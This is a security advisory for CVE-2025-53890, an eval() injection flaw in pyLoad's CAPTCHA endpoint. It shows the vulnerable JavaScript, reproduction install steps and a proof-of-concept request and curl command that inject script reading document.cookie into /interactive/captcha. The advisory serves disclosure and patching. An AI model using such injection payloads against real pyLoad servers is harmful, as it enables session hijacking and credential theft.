# pyLoad vulnerable to XSS through insecure CAPTCHA 

**GHSA**: GHSA-8w3f-4r8f-pf53 | **CVE**: CVE-2025-53890 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-79, CWE-94

**Affected Packages**:
- **pyload-ng** (pip): < 0.20

## Description

#### Summary
An unsafe JavaScript evaluation vulnerability in pyLoad’s CAPTCHA processing code allows **unauthenticated remote attackers** to execute **arbitrary code** in the client browser and potentially the backend server. Exploitation requires no user interaction or authentication and can result in session hijacking, credential theft, and full system rce.



#### Details
The vulnerable code resides in 
```javascript
function onCaptchaResult(result) {
    eval(result); // Direct execution of attacker-controlled input
}
```

* The `onCaptchaResult()` function directly passes CAPTCHA results (sent from the user) into `eval()`
* No sanitization or validation is performed on this input
* A malicious CAPTCHA result can include JavaScript such as `fetch()` or `child_process.exec()` in environments using NodeJS
* Attackers can fully hijack sessions and pivot to remote code execution on the server if the environment allows it



### Reproduction Methods
1. **Official Source Installation**:
```bash
git clone https://github.com/pyload/pyload
cd pyload
git checkout 0.4.20
python -m pip install -e .
pyload --userdir=/tmp/pyload
```

2. **Virtual Environment**:
```bash
python -m venv pyload-env
source pyload-env/bin/activate
pip install pyload==0.4.20
pyload
```

## CAPTCHA Endpoint Verification


**Technical Clarification**:  
1. The vulnerable endpoint is actually:
   ```
   /interactive/captcha
   ```

2. Complete PoC Request:
```http
POST /interactive/captcha HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded

cid=123&response=1%3Balert(document.cookie)
```

3. Curl Command Correction:
```bash
curl -X POST "http://localhost:8000/interactive/captcha" \
  -d "cid=123&response=1%3Balert(document.cookie)"
```


1. **Vulnerable Code Location**:  
   The eval() vulnerability is confirmed in:
   ```
   src/pyload/webui/app/static/js/captcha-interactive.user.js
   ```



### **Resources**

1. https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546
2. [OWASP: Avoid `eval()`](https://cheatsheetseries.owasp.org/cheatsheets/JavaScript_Security_Cheat_Sheet.html#eval)
3. [#4586](https://github.com/pyload/pyload/pull/4586)
